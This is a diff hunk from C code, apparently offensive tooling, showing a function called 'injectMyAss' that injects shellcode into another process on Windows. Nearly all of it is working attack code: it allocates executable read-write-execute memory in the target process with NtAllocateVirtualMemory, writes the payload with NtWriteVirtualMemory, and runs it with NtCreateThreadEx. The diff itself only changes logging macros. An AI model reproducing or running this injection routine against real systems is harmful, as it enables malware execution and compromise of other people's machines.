@@ -17,55 +17,55 @@ BOOL injectMyAss(IN HANDLE hProcess, IN DWORD PID, IN PBYTE pShellcode, IN SIZE_
 
 
 
-    info("allocating buffer in process memory...");
+    PRINTA("allocating buffer in process memory...\n");
     STATUS = NtAllocateVirtualMemory(hProcess, &pAddress, 0, &sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!STATUS == STATUS_SUCCESS) {
-        warn("[NtAllocateVirtualMemory] failed to allocate memory, error: 0x%x", STATUS);
+        PRINTA("[NtAllocateVirtualMemory] failed to allocate memory, error: 0x%x\n", STATUS);
         goto CLEANUP;
     }
-    okay("allocated buffer with PAGE_EXECUTE_READWRITE [RWX] permissions!");
+    PRINTA("allocated buffer with PAGE_EXECUTE_READWRITE [RWX] permissions!\n");
 
 
 
-    info("writing payload to allocated buffer...");
+    PRINTA("writing payload to allocated buffer...\n");
     STATUS = NtWriteVirtualMemory(hProcess, pAddress, pShellcode, sShellcodeSize, &sBytesWritten);
     if (!STATUS == STATUS_SUCCESS) {
-        warn("[NtWriteVirtualMemory] failed to write to allocated buffer, error: 0x%x", STATUS);
+        PRINTA("[NtWriteVirtualMemory] failed to write to allocated buffer, error: 0x%x\n", STATUS);
         goto CLEANUP;
     }
-    okay("wrote %zu-bytes to allocated buffer!", sBytesWritten);
+    PRINTA("wrote %zu-bytes to allocated buffer!\n", sBytesWritten);
 
 
 
 
-    info("creating thread, beginning execution");
+    PRINTA("creating thread, beginning execution\n");
     STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, 0, 0, 0, NULL);
     if (!STATUS == STATUS_SUCCESS) {
-        warn("[NtCreateThreadEx] failed to create thread, error: 0x%x", STATUS);
+        PRINTA("[NtCreateThreadEx] failed to create thread, error: 0x%x\n", STATUS);
         goto CLEANUP;
     }
-    okay("thread created!");
+    PRINTA("thread created!\n");
 
 
-    info("waiting for thread to finish executing...");
+    PRINTA("waiting for thread to finish executing...\n");
     STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
     if (!STATUS == STATUS_SUCCESS) {
-        warn("[NtWaitForSingleObject] failed to wait for thread to finsih, error: 0x%x", STATUS);
+        PRINTA("[NtWaitForSingleObject] failed to wait for thread to finsih, error: 0x%x\n", STATUS);
         goto CLEANUP;
     }
-    okay("thread execute succesfully!");
+    PRINTA("thread execute succesfully!\n");
 
     goto CLEANUP;
 
 CLEANUP:
-    info("clean up, closing thread handle...");
+    PRINTA("clean up, closing thread handle...\n");
     STATUS = NtClose(hThread);
     if (!STATUS == STATUS_SUCCESS) {
-        warn("[NtClose] Unable to close thread handle, error: 0x%x", STATUS);
+        PRINTA("[NtClose] Unable to close thread handle, error: 0x%x\n", STATUS);
         return EXIT_FAILURE;
     }
-    okay("thread handle closed!");
+    PRINTA("thread handle closed!\n");
 
-    okay("cleanup complete! have fun!");
+    PRINTA("cleanup complete! have fun!\n");
     return TRUE;
 }
